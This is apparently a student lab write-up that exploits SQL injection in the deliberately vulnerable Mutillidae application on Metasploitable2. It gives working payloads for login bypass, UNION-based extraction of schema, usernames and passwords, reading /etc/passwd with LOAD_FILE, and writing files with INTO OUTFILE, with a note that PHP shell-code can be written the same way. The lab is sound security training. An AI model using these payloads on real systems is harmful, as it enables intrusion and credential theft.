# SQL Injection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/danush564/sqlinjection/assets/98585166/055ea058-43de-486d-b0e7-915879a14a14)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/danush564/sqlinjection/assets/98585166/dac40261-e2cb-4780-943f-38e20e18df37)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/danush564/sqlinjection/assets/98585166/99e0116f-12fa-4f2e-ae0f-8a34410b51ac)
Click on the menu Login/Register and register for an account


![image](https://github.com/danush564/sqlinjection/assets/98585166/45782d5f-9188-4af2-a8b3-1144210fed32)

Click on “Create Account” to display the following page:
![image](https://github.com/danush564/sqlinjection/assets/98585166/75d92b90-bb06-4e7b-850a-28c1c1ffaecd)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

Click “Login”. The logged in page will show as below:
![image](https://github.com/danush564/sqlinjection/assets/98585166/0a723080-eee7-4c42-8b32-b3058d1db2c9)



##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

Click the login button and you will see it enter into the administrator page.
![image](https://github.com/danush564/sqlinjection/assets/98585166/58da5525-6144-4220-aa95-ffb19e4813c4)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![image](https://github.com/danush564/sqlinjection/assets/98585166/f32e7f26-2e7a-4689-bc32-6cc5ecc44163)

![Screenshot 2023-06-10 224452](https://github.com/praveenst13/sqlinjection/assets/118787793/7b70cf08-aa04-4ba1-b7e5-12f048c98c57)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![Screenshot 2023-06-10 224702](https://github.com/praveenst13/sqlinjection/assets/118787793/10c8f015-3770-46b5-b320-bf37cc7bbdae)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/danush564/sqlinjection/assets/98585166/9a076952-6345-48ca-91de-0fc23bee5e85)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/danush564/sqlinjection/assets/98585166/45b6e863-bb4a-459a-a103-f66bae537584)



When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/danush564/sqlinjection/assets/98585166/abcec5bd-e83a-47d4-a831-dd1d21a2dd45)


 As it is having 5 columns the query worked fine and it provides the correct result


![image](https://github.com/danush564/sqlinjection/assets/98585166/bc1d09ec-28fc-4547-bbe2-ea5b514cd413)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/danush564/sqlinjection/assets/98585166/bf48c145-7fa8-4a46-91bc-4a9645fe3a56)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/danush564/sqlinjection/assets/98585166/8d038d9f-3065-4733-b237-bc8d58870cb6)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/danush564/sqlinjection/assets/98585166/9cb4982e-ed02-4e6b-a621-0948a35e33ae)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




![image](https://github.com/danush564/sqlinjection/assets/98585166/caa343fc-4a23-457a-97f4-411ea830f2e6)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/danush564/sqlinjection/assets/98585166/6eb15b02-ac39-4d4a-aa4f-397b820b58d1)




Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/danush564/sqlinjection/assets/98585166/63144d1b-fa68-4686-bde9-0afc683eedd5)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/danush564/sqlinjection/assets/98585166/a2c77987-be40-42af-9bae-52bdc9f4a3ee)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
